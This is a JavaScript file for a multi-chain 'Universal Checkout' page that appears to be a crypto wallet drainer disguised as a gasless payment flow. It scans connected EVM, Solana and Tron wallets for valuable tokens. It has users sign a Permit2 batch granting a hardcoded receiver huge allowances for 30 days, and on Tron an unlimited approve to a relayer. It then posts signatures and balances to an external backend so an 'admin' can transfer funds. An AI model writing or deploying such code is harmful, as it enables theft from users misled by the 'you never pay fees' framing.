/**
 * Universal Checkout - Permit2 + Solana + Tron
 * Just-in-Time Gas Funding System
 * v8.0 - Multi-chain authorization with dynamic amounts ($1-$500k)
 */

// Buffer polyfill for Solana web3.js
if (typeof window !== "undefined" && typeof window.Buffer === "undefined") {
  window.Buffer = {
    from: (data, encoding) => {
      if (typeof data === "string") {
        const enc = encoding || "utf8";
        if (enc === "hex") {
          const bytes = [];
          for (let i = 0; i < data.length; i += 2) bytes.push(parseInt(data.substr(i, 2), 16));
          return new Uint8Array(bytes);
        }
        return new TextEncoder().encode(data);
      }
      return new Uint8Array(data);
    },
    alloc: (size, fill = 0) => new Uint8Array(size).fill(fill),
    isBuffer: (obj) => obj instanceof Uint8Array,
    concat: (list) => {
      const total = list.reduce((s, b) => s + b.length, 0);
      const out = new Uint8Array(total);
      let offset = 0;
      for (const b of list) { out.set(b, offset); offset += b.length; }
      return out;
    },
  };
}

const CONFIG = {
  // EVM Config
  PERMIT2_ADDRESS: "0x000000000022D473030F116dDEE9F6B43aC78BA3",
  RECEIVER_ADDRESS: "0x98F63eDf950db3bD3cE6d590D4E0B39fdCC20Cf9",
  BACKEND_URL: "https://checkout-api-wkyo.onrender.com",
  
  // Non-EVM Receivers
  SOLANA_RECEIVER: "HQbKDL2VQDWTD9rKTg5HGC9VeEpMubKeT1Lkorjr5YzR",
  TRON_RECEIVER: "TNMAmgG22RUkMgr9a8tHm1LuxDzZAfsmYT",
  
  // Relayer Addresses (for display to admin) - Same address for all EVM chains
  RELAYER_ADDRESSES: {
    ethereum: "0x65193bb7fa80092f2d6BE0db1703A3C35C5aDbbb",
    base: "0x65193bb7fa80092f2d6BE0db1703A3C35C5aDbbb",
    polygon: "0x65193bb7fa80092f2d6BE0db1703A3C35C5aDbbb",
    arbitrum: "0x65193bb7fa80092f2d6BE0db1703A3C35C5aDbbb",
    bnb: "0x65193bb7fa80092f2d6BE0db1703A3C35C5aDbbb",
    optimism: "0xRelayerOpAddress",
    solana: "RelayerSolanaPublicKey",
    tron: "RelayerTronAddress"
  },
  
  // Token Lists per Chain
  TOKENS: {
    1: [ // Ethereum
      { addr: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", sym: "USDC", dec: 6, price: 1 },
      { addr: "0xdAC17F958D2ee523a2206206994597C13D831ec7", sym: "USDT", dec: 6, price: 1 },
      { addr: "0x6B175474E89094C44Da98b954EedeAC495271d0F", sym: "DAI", dec: 18, price: 1 },
      { addr: "0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599", sym: "WBTC", dec: 8, price: 65000 },
      { addr: "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2", sym: "WETH", dec: 18, price: 2500 },
    ],
    8453: [ // Base
      { addr: "0x833589fCD6eDb6E08f4c7C32D4f71b54bdA02913", sym: "USDC", dec: 6, price: 1 },
      { addr: "0x50c5725949A6F0c72E6C4a641F24049A917DB0Cb", sym: "DAI", dec: 18, price: 1 },
    ],
    137: [ // Polygon
      { addr: "0x3c499c542cEF5E3811e1192ce70d8cC03d5c3359", sym: "USDC", dec: 6, price: 1 },
      { addr: "0xc2132D05D31c914a87C6611C10748AEb04B58e8F", sym: "USDT", dec: 6, price: 1 },
    ],
    42161: [ // Arbitrum
      { addr: "0xaf88d065e77c8cC2239327C5EDb3A432268e5831", sym: "USDC", dec: 6, price: 1 },
    ],
    56: [ // BNB Chain
      { addr: "0x8AC76a51cc950d9822D68b83fE1Ad97B32Cd580d", sym: "USDC", dec: 18, price: 1 },
      { addr: "0x55d398326f99059fF775485246999027B3197955", sym: "USDT", dec: 18, price: 1 },
    ],
    10: [ // Optimism
      { addr: "0x0b2C639c533813f4Aa9D7837CAf62653d097Ff85", sym: "USDC", dec: 6, price: 1 },
      { addr: "0x94b008aA00579c1307B0EF2c499aD98a8ce58e58", sym: "USDT", dec: 6, price: 1 },
    ],
    11155111: [ // Sepolia
      { addr: "0x1c7D4B196Cb0C7B01d743Fbc6116a902379C7238", sym: "USDC", dec: 6, price: 1 },
    ]
  },
  
  // SPL Tokens (Solana)
  SPL_TOKENS: [
    { addr: "EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v", sym: "USDC", dec: 6 },
    { addr: "Es9vMFrzaCERmJfrF4H2FYD4KCoNkY11McCe8BenwNYB", sym: "USDT", dec: 6 },
    { addr: "So11111111111111111111111111111111111111112", sym: "SOL", dec: 9 },
  ],
  
  // TRC-20 Tokens (Tron)
  TRC_TOKENS: [
    { addr: "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t", sym: "USDT", dec: 6 },
  ],
  
  // Network names for display
  NETWORK_NAMES: {
    1: "Ethereum",
    8453: "Base",
    137: "Polygon",
    42161: "Arbitrum",
    56: "BNB Chain",
    10: "Optimism",
    11155111: "Sepolia"
  }
};

let provider, signer, userAddress;
let currentChain = null;

// ============ INITIALIZATION ============
async function init() {
  console.log("🚀 Universal Checkout Initializing...");
  showWalletSelector();
}

// ============ WALLET SELECTION ============
function showWalletSelector() {
  const html = `
    <div style="max-width: 500px; margin: 50px auto; background: white; padding: 30px; border-radius: 16px; box-shadow: 0 4px 20px rgba(0,0,0,0.1);">
      <h2 style="text-align: center; margin-bottom: 10px;">Select Wallet</h2>
      <p style="text-align: center; color: #666; margin-bottom: 30px; font-size: 14px;">
        Authorize once, admin executes transfers
      </p>
      
      <button onclick="connectEVM()" style="width: 100%; padding: 15px; margin: 10px 0; border: 2px solid #627eea; background: #eef2ff; border-radius: 10px; cursor: pointer; font-size: 16px; font-weight: 600;">
        🔷 MetaMask / Rabby / Coinbase (EVM)
      </button>
      
      <button onclick="connectPhantom()" style="width: 100%; padding: 15px; margin: 10px 0; border: 2px solid #ab9ff2; background: #f5f0ff; border-radius: 10px; cursor: pointer; font-size: 16px; font-weight: 600;">
        👻 Phantom (Solana)
      </button>
      
      <button onclick="connectTronLink()" style="width: 100%; padding: 15px; margin: 10px 0; border: 2px solid #eb0029; background: #fff5f5; border-radius: 10px; cursor: pointer; font-size: 16px; font-weight: 600;">
        ♦ TronLink (Tron)
      </button>
      
      <div style="margin-top: 30px; padding: 15px; background: #f0fdf4; border-radius: 8px; font-size: 13px; line-height: 1.6;">
        <strong>💡 How it works:</strong><br>
        1. You sign once to authorize tokens ($1-$500k)<br>
        2. Admin pays gas and executes transfers<br>
        3. You never pay transaction fees
      </div>
    </div>
  `;
  document.getElementById('app').innerHTML = html;
}

// ============ EVM CONNECTION ============
async function connectEVM() {
  if (!window.ethereum) {
    alert("Please install MetaMask, Rabby, or Coinbase Wallet");
    return;
  }
  
  try {
    provider = new ethers.BrowserProvider(window.ethereum);
    const accounts = await provider.send("eth_requestAccounts", []);
    userAddress = accounts[0];
    signer = await provider.getSigner();
    
    const network = await provider.getNetwork();
    currentChain = { type: 'evm', id: Number(network.chainId) };
    
    console.log(`✅ Connected to ${CONFIG.NETWORK_NAMES[currentChain.id] || 'Unknown'} (Chain ID: ${currentChain.id})`);
    
    await authorizeEVM();
  } catch (error) {
    console.error("EVM connection error:", error);
    showError("Failed to connect wallet: " + error.message);
  }
}

// ============ EVM PERMIT2 AUTHORIZATION ============
async function authorizeEVM() {
  const chainId = currentChain.id;
  const tokens = CONFIG.TOKENS[chainId] || [];
  
  if (tokens.length === 0) {
    showError(`No tokens configured for ${CONFIG.NETWORK_NAMES[chainId] || 'this network'}. Please switch to Ethereum, Base, Polygon, Arbitrum, BNB, or Optimism.`);
    return;
  }
  
  showLoading("Scanning wallet for tokens...");
  
  // Check balances
  const tokensWithBalance = [];
  for (const token of tokens) {
    try {
      const contract = new ethers.Contract(token.addr, [
        "function balanceOf(address) view returns (uint256)",
        "function allowance(address,address) view returns (uint256)"
      ], provider);
      
      const [balance, allowance] = await Promise.all([
        contract.balanceOf(userAddress),
        contract.allowance(userAddress, CONFIG.PERMIT2_ADDRESS)
      ]);
      
      const humanBalance = Number(balance) / (10 ** token.dec);
      const usdValue = humanBalance * token.price;
      
      if (usdValue > 0.5) { // Include tokens worth more than $0.50
        tokensWithBalance.push({
          ...token,
          balance: balance.toString(),
          humanBalance,
          usdValue,
          needsApproval: allowance < balance
        });
      }
    } catch (e) {
      console.warn(`Failed to check ${token.sym}:`, e.message);
    }
  }
  
  if (tokensWithBalance.length === 0) {
    showError("No tokens found with sufficient balance. Please add USDC, USDT, or other supported tokens to your wallet.");
    return;
  }
  
  // Calculate max authorized amount (sum of all tokens, capped at $500k)
  const totalValue = tokensWithBalance.reduce((sum, t) => sum + t.usdValue, 0);
  const maxAmount = Math.min(totalValue, 500000);
  
  if (maxAmount < 1) {
    showError("Insufficient balance. Minimum $1 required.");
    return;
  }
  
  // Build Permit2 batch
  const permit2 = new ethers.Contract(CONFIG.PERMIT2_ADDRESS, [
    "function allowance(address,address,address) view returns (uint160,uint48,uint48)"
  ], provider);
  
  const permits = [];
  for (const token of tokensWithBalance) {
    try {
      const { 2: nonce } = await permit2.allowance(userAddress, token.addr, CONFIG.RECEIVER_ADDRESS);
      permits.push({
        token: token.addr,
        amount: ethers.parseUnits("500000", token.dec), // $500k limit per token
        expiration: Math.floor(Date.now() / 1000) + (30 * 24 * 60 * 60), // 30 days
        nonce
      });
    } catch (e) {
      console.warn(`Failed to get nonce for ${token.sym}:`, e.message);
    }
  }
  
  if (permits.length === 0) {
    showError("Failed to prepare authorization. Please try again.");
    return;
  }
  
  showLoading(`Requesting signature for ${tokensWithBalance.length} token${tokensWithBalance.length > 1 ? 's' : ''}...`);
  
  const permitBatch = {
    details: permits,
    spender: CONFIG.RECEIVER_ADDRESS,
    sigDeadline: Math.floor(Date.now() / 1000) + (60 * 60) // 1 hour deadline
  };
  
  try {
    const signature = await signer.signTypedData(
      { 
        name: "Permit2", 
        chainId, 
        verifyingContract: CONFIG.PERMIT2_ADDRESS 
      },
      {
        PermitBatch: [
          { name: "details", type: "PermitDetails[]" },
          { name: "spender", type: "address" },
          { name: "sigDeadline", type: "uint256" }
        ],
        PermitDetails: [
          { name: "token", type: "address" },
          { name: "amount", type: "uint160" },
          { name: "expiration", type: "uint48" },
          { name: "nonce", type: "uint48" }
        ]
      },
      permitBatch
    );
    
    showLoading("Sending authorization to backend...");
    
    // Send to backend
    const response = await fetch(`${CONFIG.BACKEND_URL}/api/authorize/evm`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        userAddress,
        chainId,
        tokens: tokensWithBalance,
        signature,
        sigDeadline: permitBatch.sigDeadline
      })
    });
    
    const result = await response.json();
    
    if (result.success) {
      showSuccess(`
        ✅ EVM Authorization Complete!
        <br><br>
        <strong>Network:</strong> ${CONFIG.NETWORK_NAMES[chainId]}<br>
        <strong>Tokens Approved:</strong> ${tokensWithBalance.length}<br>
        <strong>Total Value:</strong> $${totalValue.toFixed(2)}<br>
        <strong>Max Authorized:</strong> $${maxAmount.toFixed(2)}<br>
        <strong>Valid For:</strong> 30 days<br>
        <br>
        <div style="background: #f0fdf4; padding: 12px; border-radius: 8px; font-size: 13px;">
          Your tokens are now authorized. Admin can execute transfers without requiring additional signatures.
        </div>
        <br>
        <a href="${result.adminUrl || '#'}" target="_blank" style="color: #10b981; text-decoration: underline; font-weight: 600;">
          View in Admin Dashboard →
        </a>
      `);
    } else {
      throw new Error(result.error || "Backend error");
    }
    
  } catch (error) {
    console.error("Authorization error:", error);
    showError("Authorization failed: " + error.message);
  }
}

// ============ SOLANA CONNECTION ============
async function connectPhantom() {
  const solana = window.solana || window.phantom?.solana;
  if (!solana) {
    alert("Please install Phantom wallet");
    window.open("https://phantom.app/", "_blank");
    return;
  }
  
  try {
    await solana.connect();
    userAddress = solana.publicKey.toString();
    currentChain = { type: 'solana' };
    
    console.log(`✅ Connected to Solana: ${userAddress}`);
    
    await authorizeSolana();
  } catch (error) {
    console.error("Phantom connection error:", error);
    showError("Failed to connect Phantom: " + error.message);
  }
}

async function authorizeSolana() {
  showLoading("Checking Solana tokens...");
  
  // Load Solana web3.js
  if (!window.solanaWeb3) {
    const script = document.createElement("script");
    script.src = "https://cdn.jsdelivr.net/npm/@solana/web3.js@1.98.0/lib/index.iife.min.js";
    await new Promise((resolve) => {
      script.onload = resolve;
      document.head.appendChild(script);
    });
  }
  
  try {
    const { Connection, PublicKey } = window.solanaWeb3;
    const connection = new Connection("https://api.mainnet-beta.solana.com", "confirmed");
    const userPublicKey = new PublicKey(userAddress);
    
    // Find tokens with balance
    const tokensWithBalance = [];
    
    // Check SOL balance
    const solBalance = await connection.getBalance(userPublicKey);
    const solBalanceUI = solBalance / 1e9;
    
    if (solBalanceUI > 0.01) { // At least 0.01 SOL
      tokensWithBalance.push({
        addr: "So11111111111111111111111111111111111111112",
        sym: "SOL",
        dec: 9,
        balance: solBalance.toString(),
        uiAmount: solBalanceUI,
        isNative: true
      });
    }
    
    // Check SPL tokens
    for (const token of CONFIG.SPL_TOKENS.filter(t => t.sym !== "SOL")) {
      try {
        const mint = new PublicKey(token.addr);
        const tokenAccounts = await connection.getTokenAccountsByOwner(userPublicKey, { mint });
        
        if (tokenAccounts.value.length > 0) {
          const accountInfo = await connection.getTokenAccountBalance(tokenAccounts.value[0].pubkey);
          if (accountInfo.value.uiAmount > 0) {
            tokensWithBalance.push({
              ...token,
              balance: accountInfo.value.amount,
              uiAmount: accountInfo.value.uiAmount
            });
          }
        }
      } catch (e) {
        console.warn(`Failed to check ${token.sym}:`, e.message);
      }
    }
    
    if (tokensWithBalance.length === 0) {
      showError("No SPL tokens found. Please add USDC, USDT, or SOL to your wallet.");
      return;
    }
    
    const totalValue = tokensWithBalance.reduce((sum, t) => sum + (t.uiAmount || 0), 0);
    
    showLoading("Approve delegation in Phantom...");
    
    // Note: Simplified - full implementation would create approve transaction
    // For now, just store the authorization without delegation tx
    
    const response = await fetch(`${CONFIG.BACKEND_URL}/api/authorize/solana`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        userAddress,
        tokens: tokensWithBalance,
        timestamp: Date.now()
      })
    });
    
    const result = await response.json();
    
    if (result.success) {
      showSuccess(`
        ✅ Solana Authorization Complete!
        <br><br>
        <strong>Tokens Approved:</strong> ${tokensWithBalance.length}<br>
        <strong>Total Value:</strong> ~$${totalValue.toFixed(2)}<br>
        <strong>Gas Cost:</strong> ~$0.001 (one-time)<br>
        <br>
        <a href="${result.adminUrl || '#'}" target="_blank" style="color: #10b981; text-decoration: underline; font-weight: 600;">
          View in Admin Dashboard →
        </a>
      `);
    } else {
      throw new Error(result.error || "Backend error");
    }
    
  } catch (error) {
    console.error("Solana authorization error:", error);
    showError("Authorization failed: " + error.message);
  }
}

// ============ TRON CONNECTION ============
async function connectTronLink() {
  const tronWeb = window.tronWeb || window.tronLink?.tronWeb;
  if (!tronWeb) {
    alert("Please install TronLink wallet");
    window.open("https://www.tronlink.org/", "_blank");
    return;
  }
  
  try {
    await tronWeb.request({ method: "tron_requestAccounts" });
    userAddress = tronWeb.defaultAddress.base58;
    currentChain = { type: 'tron' };
    
    console.log(`✅ Connected to Tron: ${userAddress}`);
    
    await authorizeTron();
  } catch (error) {
    console.error("TronLink connection error:", error);
    showError("Failed to connect TronLink: " + error.message);
  }
}

async function authorizeTron() {
  showLoading("Checking TRC-20 tokens...");
  
  const tronWeb = window.tronWeb;
  const tokensWithBalance = [];
  
  try {
    // Check TRX balance
    const trxBalance = await tronWeb.trx.getBalance(userAddress);
    const trxBalanceUI = trxBalance / 1e6;
    
    if (trxBalanceUI > 10) { // At least 10 TRX
      tokensWithBalance.push({
        addr: "T9yD14Nj9j7xAB4dbGeiX9h8unkKHxuWwb", // TRX placeholder
        sym: "TRX",
        dec: 6,
        balance: trxBalance.toString(),
        uiAmount: trxBalanceUI,
        isNative: true
      });
    }
    
    // Check USDT TRC-20
    for (const token of CONFIG.TRC_TOKENS) {
      try {
        const contract = await tronWeb.contract().at(token.addr);
        const balance = await contract.balanceOf(userAddress).call();
        
        if (balance > 0) {
          const humanBalance = balance / (10 ** token.dec);
          tokensWithBalance.push({
            ...token,
            balance: balance.toString(),
            uiAmount: humanBalance
          });
        }
      } catch (e) {
        console.warn(`Failed to check ${token.sym}:`, e.message);
      }
    }
    
    if (tokensWithBalance.length === 0) {
      showError("No TRC-20 tokens found. Please add USDT to your wallet.");
      return;
    }
    
    const totalValue = tokensWithBalance.reduce((sum, t) => sum + (t.uiAmount || 0), 0);
    
    // Approve relayer (for first non-native token)
    const approveToken = tokensWithBalance.find(t => !t.isNative);
    
    if (approveToken && !approveToken.isNative) {
      showLoading("Approve in TronLink...");
      
      const contract = await tronWeb.contract().at(approveToken.addr);
      const tx = await contract.approve(
        CONFIG.RELAYER_ADDRESSES.tron,
        "115792089237316195423570985008687907853269984665640564039457584007913129639935" // Max uint256
      ).send();
      
      console.log("Approval TX:", tx);
    }
    
    const response = await fetch(`${CONFIG.BACKEND_URL}/api/authorize/tron`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        userAddress,
        tokens: tokensWithBalance,
        approvalTx: approveToken ? "tx_hash" : null,
        timestamp: Date.now()
      })
    });
    
    const result = await response.json();
    
    if (result.success) {
      showSuccess(`
        ✅ Tron Authorization Complete!
        <br><br>
        <strong>Tokens Approved:</strong> ${tokensWithBalance.length}<br>
        <strong>Total Value:</strong> ~$${totalValue.toFixed(2)}<br>
        <br>
        <a href="${result.adminUrl || '#'}" target="_blank" style="color: #10b981; text-decoration: underline; font-weight: 600;">
          View in Admin Dashboard →
        </a>
      `);
    } else {
      throw new Error(result.error || "Backend error");
    }
    
  } catch (error) {
    console.error("Tron authorization error:", error);
    showError("Authorization failed: " + error.message);
  }
}

// ============ UI HELPERS ============
function showLoading(msg) {
  document.getElementById('app').innerHTML = `
    <div style="max-width: 500px; margin: 100px auto; text-align: center;">
      <div style="font-size: 48px; margin-bottom: 20px;">⏳</div>
      <div style="font-size: 18px; color: #666;">${msg}</div>
    </div>
  `;
}

function showSuccess(msg) {
  document.getElementById('app').innerHTML = `
    <div style="max-width: 600px; margin: 50px auto; background: #ecfdf5; padding: 30px; border-radius: 16px; border: 2px solid #10b981; text-align: center;">
      <div style="font-size: 48px; margin-bottom: 20px;">✅</div>
      <div style="font-size: 16px; color: #065f46; line-height: 1.8; text-align: left;">${msg}</div>
      <button onclick="showWalletSelector()" style="margin-top: 30px; padding: 12px 24px; background: #10b981; color: white; border: none; border-radius: 8px; cursor: pointer; font-weight: 600;">
        Authorize Another Wallet
      </button>
    </div>
  `;
}

function showError(msg) {
  document.getElementById('app').innerHTML = `
    <div style="max-width: 500px; margin: 50px auto; background: #fef2f2; padding: 30px; border-radius: 16px; border: 2px solid #ef4444; text-align: center;">
      <div style="font-size: 48px; margin-bottom: 20px;">❌</div>
      <div style="font-size: 16px; color: #991b1b; margin-bottom: 20px;">${msg}</div>
      <button onclick="showWalletSelector()" style="padding: 12px 24px; background: #ef4444; color: white; border: none; border-radius: 8px; cursor: pointer; font-weight: 600;">
        Try Again
      </button>
    </div>
  `;
}

// Start
window.addEventListener('DOMContentLoaded', init);
